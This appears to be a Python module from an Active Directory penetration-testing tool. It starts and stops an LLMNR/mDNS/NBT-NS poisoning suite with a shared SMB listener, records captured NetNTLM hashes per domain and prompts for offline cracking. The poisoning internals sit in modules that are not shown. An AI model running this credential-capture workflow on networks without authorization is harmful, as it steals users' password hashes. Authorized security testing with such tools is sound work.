"""CLI orchestration for the native LLMNR / mDNS / NBT-NS poisoning suite.

Replaces the legacy Responder integration with an entirely in-process,
async, MIT-compatible implementation (``services.poisoning`` +
``services.relay.smb_ntlm_capture``).

User flow stays identical: a single ``start_poisoning(shell)`` call brings
up the three poisoners *and* the SMB capture listener; every captured NTLM
hash is routed through the same ``save_ntlm_hash`` + ``ask_for_cracking``
pipeline that Responder used.

Threading model
---------------
The async stack (``PoisoningSuite`` + ``SMBNtlmCaptureSource``) needs an
event loop, so it runs in a dedicated background thread.  The shell remains
synchronous; cross-thread communication uses a ``threading.Event`` for
shutdown and ``asyncio.run_coroutine_threadsafe`` is not needed because
captures are surfaced via a sync queue drained by a second thread.
"""

from __future__ import annotations

import asyncio
import contextlib
import os
import queue as _queue
import threading
from dataclasses import dataclass, field
from typing import Any, Protocol

from adscan_internal import telemetry
from adscan_internal.cli.creds import save_ntlm_hash
from adscan_internal.rich_output import (
    mark_sensitive,
    print_error,
    print_exception,
    print_info,
    print_info_debug,
    print_instruction,
    print_success,
    print_warning,
)


class PoisoningShell(Protocol):
    """Minimal shell surface required by the poisoning CLI."""

    interface: str | None
    myip: str | None
    domains_data: dict[str, dict[str, Any]]
    domains_dir: str
    cracking_dir: str
    current_workspace_dir: str | None

    def ask_for_cracking(
        self,
        hash_type: str,
        domain: str,
        hashes_file: str,
        *,
        confirm: bool = True,
    ) -> None:
        """Prompt the user to crack a captured hash."""
        ...


# ---------------------------------------------------------------------------
# Helpers — domain attribution
# ---------------------------------------------------------------------------


def _split_domain_user(raw_user: str) -> tuple[str, str | None]:
    """Split a ``DOMAIN\\user`` token; return (user, netbios_domain | None)."""

    if "\\" in raw_user:
        netbios, user = raw_user.split("\\", 1)
        return user, netbios
    return raw_user, None


#: What the operator is told when a capture cannot be attributed to a collected
#: domain. Never the storage key itself: the reserved bucket is a directory name,
#: not a domain, and printing it where a domain goes is the defect this replaces.
_UNATTRIBUTED_DOMAIN_NOTICE = "not yet attributed to a collected domain"

# Attribution itself lives in ONE place —
# ``adscan_internal.services.captured_credential_attribution.resolve_capture_domain``.
# The NetBIOS-only exact-match ladder that used to live here was both narrower
# (it compared ``domains_data[d]["netbios"]`` case-SENSITIVELY, and it had no
# answer at all for a capture that carried no NetBIOS name — the common
# NetNTLMv1-ESS shape) and a second implementation of a question the whole
# product has to answer identically. Do not reintroduce a local ladder.


# ---------------------------------------------------------------------------
# Runtime state attached to the shell
# ---------------------------------------------------------------------------


@dataclass
class _PoisoningRuntime:
    """All state for a single ``start_poisoning`` invocation."""

    thread: threading.Thread
    capture_thread: threading.Thread
    stop_event: threading.Event
    capture_queue: _queue.Queue
    loop: asyncio.AbstractEventLoop | None = None
    processed_users: set[str] = field(default_factory=set)


# ---------------------------------------------------------------------------
# Public CLI entry points
# ---------------------------------------------------------------------------


def start_poisoning(shell: PoisoningShell) -> None:
    """Start the native poisoning suite + SMB capture listener.

    Idempotent: a second call while already running is a no-op with a
    notice.
    """

    existing = getattr(shell, "_poisoning_runtime", None)
    if existing is not None and existing.thread.is_alive():
        print_warning("Poisoning suite is already running.")
        return

    # Scan policy (spec 2026-11-04 § 7.2 S6): the REPL command runs the same
    # technique as the background job, so it obeys the same check.
    from adscan_internal.services.scan_policy_enforcement import (  # noqa: PLC0415
        gate_check_runner,
    )

    if not gate_check_runner(shell, "module:poisoning"):
        return

    # The interface is asked for here, beside the decision that needs it: confirm
    # or switch the configured one, or pick one when none is set. The shared
    # chooser is the same one the scan-flow consent seam uses.
    from adscan_internal.interaction import is_non_interactive  # noqa: PLC0415
    from adscan_internal.services.background_jobs.poisoning_interface import (  # noqa: PLC0415
        choose_poisoning_interface,
    )

    if is_non_interactive(shell):
        if not shell.interface:
            print_error(
                "Poisoning needs a network interface and cannot choose one "
                "unattended. Run 'set iface <name>' first, or pass --interface."
            )
            return
    else:
        chosen = choose_poisoning_interface(shell, default_launch=True)
        if not chosen:
            print_instruction("Skipped. Run 'poisoning' again when you are ready.")
            return

    stop_event = threading.Event()
    ready_event = threading.Event()
    error_holder: list[Exception] = []
    capture_queue: _queue.Queue = _queue.Queue()
    loop_holder: list[asyncio.AbstractEventLoop] = []

    interface = shell.interface
    # Only an operator declaration is announced as-is; otherwise the poisoner
    # answers each victim with this interface's address on the victim's subnet
    # (services/poisoning/poisoner.py), so an interface-derived myip belonging to
    # another NIC is never announced on this one.
    from adscan_internal.services.listener_ip import myip_is_declared  # noqa: PLC0415

    advertised_ip = shell.myip if myip_is_declared(shell) else None

    from adscan_internal.services.background_jobs.shared_capture_listener import (  # noqa: PLC0415
        get_or_create_capture_broker,
    )

    broker = get_or_create_capture_broker(shell)

    def _async_thread() -> None:
        loop = asyncio.new_event_loop()
        loop_holder.append(loop)
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(
                _run_suite(
                    interface_name=interface,
                    advertised_ipv4=advertised_ip,
                    capture_queue=capture_queue,
                    stop_event=stop_event,
                    ready_event=ready_event,
                    error_holder=error_holder,
                    broker=broker,
                )
            )
        finally:
            try:
                loop.run_until_complete(loop.shutdown_asyncgens())
            except Exception:  # noqa: BLE001
                pass
            loop.close()

    async_thread = threading.Thread(
        target=_async_thread, name="poisoning-async", daemon=True
    )
    async_thread.start()
    ready_event.wait(timeout=15.0)

    if error_holder:
        exc = error_holder[0]
        telemetry.capture_exception(exc)
        print_error(f"Poisoning suite failed to start: {exc}")
        stop_event.set()
        async_thread.join(timeout=5.0)
        return

    if not async_thread.is_alive():
        print_error("Poisoning suite exited before becoming ready.")
        return

    capture_thread = threading.Thread(
        target=_capture_consumer,
        args=(shell, capture_queue, stop_event),
        name="poisoning-capture-consumer",
        daemon=True,
    )
    capture_thread.start()

    runtime = _PoisoningRuntime(
        thread=async_thread,
        capture_thread=capture_thread,
        stop_event=stop_event,
        capture_queue=capture_queue,
        loop=loop_holder[0] if loop_holder else None,
    )
    shell._poisoning_runtime = runtime  # type: ignore[attr-defined]
    from adscan_internal.services.network_segments import (  # noqa: PLC0415
        ROLE_POISONING,
        record_interface_role,
    )

    record_interface_role(shell, interface, ROLE_POISONING)

    print_info("Native poisoning suite started (LLMNR / mDNS / NBT-NS + SMB capture).")
    print_instruction("Use 'stop_poisoning' to stop the listeners.")


def stop_poisoning(shell: PoisoningShell) -> None:
    """Stop broadcast poisoning, however it was launched.

    Poisoning reaches the operator through two launch paths that share the same
    listener substrate, and this command stops BOTH so the intuitive verb always
    works regardless of how poisoning started:

    * the **scan flow** (``start_auth`` / ``start_unauth``) launches it as a
      background job tracked by the ``BackgroundJobRegistry``
      (``kind="poisoning"``, one job per interface);
    * the manual ``poisoning`` command starts an **in-process suite** stored on
      ``shell._poisoning_runtime``.

    A clear count of what was stopped is reported. If nothing is running,
    the "not running" notice is shown.
    """

    stopped_scopes: list[str] = []
    total_captured = 0

    # (1) Registry-tracked background poisoning jobs (the scan-flow launch path).
    #     Stopping via the registry drives each runtime's stop() and marks the
    #     job terminal — the SAME path 'jobs stop <id>' uses.
    try:
        from adscan_internal.services.background_jobs.registry import (  # noqa: PLC0415
            get_or_create_registry,
        )

        registry = get_or_create_registry(shell)
        for job in registry.active():
            if job.kind != "poisoning":
                continue
            try:
                total_captured += int(job.result_summary.get("captured", 0) or 0)
            except (TypeError, ValueError):
                pass
            registry.stop(job.id)
            stopped_scopes.append(str(job.scope or "?"))
    except Exception as exc:  # noqa: BLE001 — a registry hiccup must not block the suite stop
        telemetry.capture_exception(exc)
        print_exception(exception=exc)

    # (2) Legacy in-process suite (the manual `poisoning` command).
    runtime: _PoisoningRuntime | None = getattr(shell, "_poisoning_runtime", None)
    if runtime is not None:
        runtime.stop_event.set()
        # Sentinel so the capture consumer wakes up.
        runtime.capture_queue.put(None)
        runtime.thread.join(timeout=10.0)
        runtime.capture_thread.join(timeout=5.0)
        shell._poisoning_runtime = None  # type: ignore[attr-defined]
        stopped_scopes.append(str(getattr(shell, "interface", None) or "?"))

    if not stopped_scopes:
        print_warning("Poisoning is not running.")
        return

    # De-duplicate scopes (order-preserving) so a job + suite on the same
    # interface reads as one listener line, not two.
    scopes = list(dict.fromkeys(stopped_scopes))
    n = len(scopes)
    listener_word = "listener" if n == 1 else "listeners"
    captured_note = ""
    if total_captured:
        cred_word = "credential" if total_captured == 1 else "credentials"
        captured_note = f" {total_captured} {cred_word} captured this session."
    print_success(
        f"Stopped broadcast poisoning on {', '.join(scopes)} "
        f"({n} {listener_word})."
        f"{captured_note}"
    )


def clear_poisoning_state(shell: PoisoningShell) -> None:
    """Reset the per-session dedup set so the same victim can re-trigger crack prompts."""

    runtime: _PoisoningRuntime | None = getattr(shell, "_poisoning_runtime", None)
    if runtime is None:
        print_warning("Poisoning suite is not running — nothing to clear.")
        return
    runtime.processed_users.clear()
    print_success("Poisoning capture history cleared.")


# ---------------------------------------------------------------------------
# Background workers
# ---------------------------------------------------------------------------


def _obs_to_poisoning_dict(obs: Any) -> dict[str, str]:
    """Adapt a broker ``NtlmCaptureObservation`` to the poisoning capture dict.

    The shared broker's listener packs the captured principal as ``raw_user`` =
    ``DOMAIN\\user`` (NetBIOS domain preserved) with ``clean_user`` the bare
    name; the poisoning consumer expects ``{username, domain_netbios, fullhash,
    version}``. This mirrors, verbatim, the old inline mapping from
    ``extract_ntlm_hash`` this coroutine used before the :445 capture moved to
    the broker.
    """
    raw = str(getattr(obs, "raw_user", "") or "")
    netbios = raw.split("\\", 1)[0] if "\\" in raw else ""
    version = "v1" if getattr(obs, "ntlm_version", "") == "NTLMv1" else "v2"
    return {
        "username": str(getattr(obs, "clean_user", "") or ""),
        "domain_netbios": netbios,
        "fullhash": str(getattr(obs, "fullhash", "") or ""),
        "version": version,
    }


async def _run_suite(
    *,
    interface_name: str,
    advertised_ipv4: str | None,
    capture_queue: _queue.Queue,
    stop_event: threading.Event,
    ready_event: threading.Event,
    error_holder: list[Exception],
    broker: Any,
) -> None:
    """Run the broadcast poisoning suite; :445 capture comes from the broker.

    The :445 SMB NTLM capture is NOT owned here — it is acquired from the shared
    capture-listener broker (``services.background_jobs.shared_capture_listener``)
    so poisoning, the write-share bait job, and the NTLM auth-type sweep all
    consume ONE :445 listener instead of each binding independently (which
    collides: ``[Errno 98] address already in use``). The broker fans each
    capture out to our ``on_capture`` sink, adapted to the ``capture_queue`` dict
    the existing consumer drains — so the consumer is unchanged. Only the
    LLMNR/NBT-NS/mDNS spoofers (``PoisoningSuite``, which do NOT bind :445) stay
    here. The broker is refcounted, so ``stop_poisoning`` releasing our consumer
    never tears :445 down while another consumer (e.g. the write-share bait) still
    holds it.
    """

    from adscan_internal.services.poisoning import PoisonerConfig, PoisoningSuite  # noqa: PLC0415

    poisoner_config = PoisonerConfig(
        interface_name=interface_name,
        our_ipv4=advertised_ipv4,
    )
    suite = PoisoningSuite(poisoner_config)
    consumer_id = f"poisoning@{interface_name}"
    acquired = False

    try:
        await suite.start()
        # Bind and announce are separate questions. The announced address goes
        # into the poisoned answers (``advertised_ipv4`` above, or per victim);
        # the :445 capture always asks for the WILDCARD, so N poisoning jobs (one
        # per segment NIC) and every other consumer share one listener. Routing
        # the announced address into the bind is what used to pin :445 to one
        # segment.
        acquired = broker.acquire(
            consumer_id,
            bind_ip="0.0.0.0",  # noqa: S104 - serve every segment's callbacks
            on_capture=lambda obs: capture_queue.put(_obs_to_poisoning_dict(obs)),
        )
        if not acquired:
            refusal = getattr(broker, "last_refusal", lambda _cid: None)(consumer_id)
            reason = refusal[1] if refusal else "bind failed"
            raise RuntimeError(
                f"shared :445 capture listener could not be acquired ({reason})"
            )
    except Exception as exc:  # noqa: BLE001
        error_holder.append(exc)
        with contextlib.suppress(Exception):
            await suite.stop()
        if acquired:
            with contextlib.suppress(Exception):
                broker.release(consumer_id)
        ready_event.set()
        return

    ready_event.set()
    print_info_debug(
        f"[poisoning] broadcast suite + shared :445 capture ready on iface {interface_name}"
    )

    try:
        # Capture is handled off-thread by the broker's fan-out; here we only hold
        # the broadcast spoofers alive until asked to stop.
        while not stop_event.is_set():
            await asyncio.sleep(0.3)
    finally:
        with contextlib.suppress(Exception):
            broker.release(consumer_id)
        with contextlib.suppress(Exception):
            await suite.stop()


def _capture_consumer(
    shell: PoisoningShell,
    capture_queue: _queue.Queue,
    stop_event: threading.Event,
) -> None:
    """Drain captures from the async thread, persist + prompt for cracking."""

    runtime: _PoisoningRuntime | None = getattr(shell, "_poisoning_runtime", None)
    while not stop_event.is_set():
        try:
            item = capture_queue.get(timeout=0.5)
        except _queue.Empty:
            continue
        if item is None:
            return
        try:
            _handle_capture(shell, runtime, item)
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_error("Error processing captured hash.")
            print_exception(show_locals=False, exception=exc)


_POISON_CAPTURED_NTLMV2_USERS_KEY = "poison_captured_ntlmv2_users"


def _record_poison_captured_ntlmv2_user(
    shell: PoisoningShell, domain: str, user: str
) -> None:
    """Mark ``user`` as a NetNTLMv2 principal captured via broadcast poisoning.

    Persists a JSON-safe per-domain list (never a set) in ``domains_data`` so a
    later crack-success in the cracking pipeline can distinguish a
    poisoner-captured NetNTLMv2 hash from any other NetNTLMv2 capture and
    materialize the ``PoisonCaptureNtlmv2Crack`` edge. Best-effort: provenance
    tracking must never break the capture flow.
    """
    user_clean = str(user or "").strip()
    if not user_clean:
        return
    try:
        domain_state = shell.domains_data.setdefault(domain, {})
        captured = domain_state.setdefault(_POISON_CAPTURED_NTLMV2_USERS_KEY, [])
        if not isinstance(captured, list):
            captured = []
            domain_state[_POISON_CAPTURED_NTLMV2_USERS_KEY] = captured
        if user_clean not in captured:
            captured.append(user_clean)
    except Exception as exc:  # noqa: BLE001 — provenance is best-effort
        telemetry.capture_exception(exc)
        print_exception(exception=exc)


def _handle_capture(
    shell: PoisoningShell,
    runtime: _PoisoningRuntime | None,
    item: dict,
) -> None:
    """Persist one capture and prompt the user to crack it (once per user)."""

    user = item["username"]
    netbios = item["domain_netbios"] or None
    fullhash = item["fullhash"]
    version = item["version"]

    if not user:
        return

    # Dedup FIRST so a victim broadcasting repeatedly is handled once. Previously the
    # dedup lived AFTER the domain-resolve gate below, so an unmatched NetBIOS re-fired
    # the skip warning on every capture (~20x per user in a live segment).
    processed_users = runtime.processed_users if runtime is not None else set()
    if user in processed_users:
        return
    processed_users.add(user)

    # Never drop a captured hash: a NetNTLMv2/v1 is crackable regardless of workspace
    # context, and the domain match is only needed to decide WHERE to store the cracked
    # credential. Attribution goes through the shared ladder (principal realm, recorded
    # NetBIOS map, the machine account's own machine, NetBIOS-as-label); what it cannot
    # attribute lands in the reserved bucket, which is NOT a domain and is rendered as
    # such. A bare NetBIOS short name is never used as the storage key — it reads as a
    # domain in every consumer that enumerates the workspace's domains, and it is not one.
    from adscan_internal.services.captured_credential_attribution import (  # noqa: PLC0415
        storage_domain_for_capture,
    )

    domain, attributed = storage_domain_for_capture(
        shell, netbios=netbios, principal=user
    )
    if not attributed:
        print_info(
            f"Captured hash for {mark_sensitive(user, 'user')} could not be attributed "
            "to a collected domain yet — stored for cracking and re-filed automatically "
            "once the domain is known.",
            spacing="none",
        )

    if not save_ntlm_hash(shell, domain, version, user, fullhash):
        return  # already recorded for this user

    # Record provenance so a later crack-success can materialize the
    # PoisonCaptureNtlmv2Crack attack-graph edge (source = unauthenticated
    # principal). ONLY NetNTLMv2 — the NetNTLMv1 avenue has its own steps
    # (higher likelihood/impact) and is not folded in here. Bare capture is the
    # LLMNR/NBT-NS poisoning FINDING; the edge is materialized only when the
    # cracking pipeline recovers a usable credential.
    # Only when the capture IS attributed: the reserved bucket is not a domain,
    # so a graph-edge precursor recorded against it keys the follow-up step to
    # nothing. The reconcile re-files the material and the next scan records it.
    if version == "v2" and attributed:
        _record_poison_captured_ntlmv2_user(shell, domain, user)

    print_success(f"New NTLM{version} hash captured:")
    print_info(f"User: {user}", spacing="none")
    if netbios:
        print_info(f"NetBIOS Domain: {netbios}", spacing="none")
    if attributed:
        print_info(f"Full Domain: {mark_sensitive(domain, 'domain')}", spacing="none")
    else:
        print_info(f"Full Domain: {_UNATTRIBUTED_DOMAIN_NOTICE}", spacing="none")
    print_info(f"Hash: {fullhash}", spacing="none")
    hash_file = os.path.join(
        shell.domains_dir, domain, shell.cracking_dir, f"{user}_hashes.NTLM{version}"
    )

    # Screenshot moment: first foothold credential captured via poisoning.
    # Augments (does not replace) the print_success above so existing logs
    # and tests stay backwards-compatible.
    try:
        from adscan_core.rich_output_collection import (
            DiscoveryCard,
            print_discovery_card,
        )

        masked_user = mark_sensitive(user, "user")
        evidence_lines = [f"NTLM{version} hash captured via poisoning"]
        if netbios:
            evidence_lines.append(f"NetBIOS: {mark_sensitive(netbios, 'domain')}")
        if not attributed:
            evidence_lines.append(_UNATTRIBUTED_DOMAIN_NOTICE)
        evidence_lines.append("Hash written to workspace; offline cracking pending.")
        card_target = (
            f"{masked_user}@{mark_sensitive(domain, 'domain')}"
            if attributed
            else str(masked_user)
        )
        print_discovery_card(
            DiscoveryCard(
                severity="high",
                headline="FOOTHOLD CREDENTIAL CAPTURED",
                target=card_target,
                evidence=tuple(evidence_lines),
                next_action=(
                    "Crack offline with weakpass/hashcat to convert into a "
                    "usable credential."
                ),
            )
        )
    except Exception as exc:  # pragma: no cover - presentation must never fail capture
        telemetry.capture_exception(exc)
        print_exception(exception=exc)

    # hash_type MUST be the logical type (``NTLMv1``/``NTLMv2``), NOT the account
    # name — passing ``f"{user}.NTLM{version}"`` leaked the captured principal into
    # the ``hash_type`` telemetry property (e.g. ``"ZTJC378$.NTLMv2"``) and gave
    # the cracking path a bogus type. The per-account hash file is already keyed by
    # ``user`` in ``hash_file``; the type here is version-only.
    shell.ask_for_cracking(f"NTLM{version}", domain, hash_file)


# Suppress unused-import warning when Protocol is not picked up by ruff in older builds.
_ = _split_domain_user  # exported for tests/back-compat parsing of DOMAIN\user tokens
